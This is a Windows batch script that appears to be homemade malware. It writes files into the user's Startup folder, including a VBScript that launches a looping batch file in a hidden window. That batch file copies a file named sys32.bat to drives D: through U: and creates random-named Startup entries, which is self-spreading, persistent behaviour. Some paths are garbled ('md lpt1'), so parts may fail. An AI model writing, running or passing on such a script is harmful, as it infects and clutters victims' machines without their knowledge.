@echo off
(echo @echo off
echo color 1a
echo title "Your Title"
echo echo "Youe message"
echo pause)>"%appdata%\Microsoft\windows\start menu\Programs\Startup\system.bat"
(echo @echo off
echo :A
echo mkdir "%appdata%\Microsoft\windows\start menu\Programs\Startup\%random%.bat"
echo copy /y %appdata%\md lpt1\sys32.bat d:
echo copy /y %appdata%\md lpt1\sys32.bat e:
echo copy /y %appdata%\md lpt1\sys32.bat f:
echo copy /y %appdata%\md lpt1\sys32.bat g:
echo copy /y %appdata%\md lpt1\sys32.bat h:
echo copy /y %appdata%\md lpt1\sys32.bat i:
echo copy /y %appdata%\md lpt1\sys32.bat j:
echo copy /y %appdata%\md lpt1\sys32.bat k:
echo copy /y %appdata%\md lpt1\sys32.bat l:
echo copy /y %appdata%\md lpt1\sys32.bat m:
echo copy /y %appdata%\md lpt1\sys32.bat n:
echo copy /y %appdata%\md lpt1\sys32.bat o:
echo copy /y %appdata%\md lpt1\sys32.bat p:
echo copy /y %appdata%\md lpt1\sys32.bat q:
echo copy /y %appdata%\md lpt1\sys32.bat r:
echo copy /y %appdata%\md lpt1\sys32.bat s:
echo copy /y %appdata%\md lpt1\sys32.bat t:
echo copy /y %appdata%\md lpt1\sys32.bat u:
echo goto A)>"%appdata%\md lpt1\vol.bat"
(echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "%appdata%\vol.bat" ^& Chr^(34^), 0
echo Set WshShell = Nothing) > "%appdata%\Microsoft\windows\start menu\Programs\startup\windows.vbs"
copy sys32.bat %appdata%

